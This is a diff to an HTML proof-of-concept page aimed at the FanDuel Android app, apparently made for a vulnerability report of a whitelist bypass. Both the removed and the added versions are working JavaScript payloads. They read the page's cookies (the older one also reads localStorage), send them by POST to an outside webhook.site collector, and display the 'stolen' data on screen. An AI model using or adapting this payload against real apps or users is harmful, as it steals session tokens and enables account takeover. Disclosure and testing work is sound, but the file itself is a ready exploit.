@@ -1,46 +1,12 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>FanDuel PoC</title>
-    <meta charset="utf-8">
-</head>
-<body>
-<script>
-  var stolen_cookies = document.cookie;
-  var stolen_storage = "";
-  
-  try {
-    stolen_storage = JSON.stringify(localStorage);
-  } catch(e) {
-    stolen_storage = "error: " + e;
-  }
-
-  var data = {
-    cookies:   stolen_cookies,
-    storage:   stolen_storage,
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent,
-    proof:     "FanDuel X-Auth-Token stolen via IGNORE_WHITELIST bypass"
-  };
-
-  // Your webhook
-  fetch("https://webhook.site/0090a7a3-5953-4053-b2f1-3498b6d1aae6", {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify(data)
-  });
-
-  // Visual proof for screen recording
-  document.body.innerHTML =
-    "<h2 style='color:red'>⚠️ FanDuel PoC</h2>" +
-    "<b>Target:</b> com.fanduel.android.self<br><br>" +
-    "<b>Stolen Cookies:</b>" +
-    "<pre style='background:#000;color:#0f0;padding:10px'>" + 
-        stolen_cookies + "</pre>" +
-    "<b>LocalStorage:</b>" +
-    "<pre style='background:#000;color:#0f0;padding:10px'>" + 
-        stolen_storage + "</pre>" +
-    "<b>Time:</b> " + new Date().toISOString();
-</script>
-</body>
-</html>
+<html><body><script>
+fetch('https://webhook.site/0090a7a3-5953-4053-b2f1-3498b6d1aae6', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    cookies: document.cookie,
+    origin: location.origin,
+    url: location.href
+  })
+});
+document.body.innerHTML = 'PoC running...';
+</script></body></html>
